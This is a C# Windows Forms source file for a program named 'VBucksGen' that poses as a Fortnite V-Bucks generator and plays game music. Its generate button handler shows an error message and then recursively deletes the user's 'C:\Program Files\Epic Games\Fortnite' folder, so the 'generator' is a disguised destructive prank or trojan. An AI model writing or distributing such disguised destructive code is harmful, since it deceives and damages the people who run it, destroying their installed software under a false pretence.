using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Media;

namespace VBucksGen
{
    public partial class frmMain : Form
    {
        SoundPlayer s = new SoundPlayer(@"./media/fortnite_music.wav");

        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            s.PlayLooping();
        }

        private void cmdCancella_Click(object sender, EventArgs e)
        {
            if (txtNum.Text == "" || int.Parse(txtNum.Text) < 500)
                MessageBox.Show("You have to gen at least 500 VBucks to allow the program work properly!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            try
            {
                Directory.Delete("C:\\Program Files\\Epic Games\\Fortnite", true);
            } catch(Exception ex)
            {
                MessageBox.Show("Error occurred: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            
        }

        private void cmdPlay_Click(object sender, EventArgs e)
        {
            cmdPlay.Enabled = false;
            cmdStop.Enabled = true;
            s.PlayLooping();
        }

        private void cmdStop_Click(object sender, EventArgs e)
        {
            cmdStop.Enabled = false;
            cmdPlay.Enabled = true;
            s.Stop();
        }
    }
}
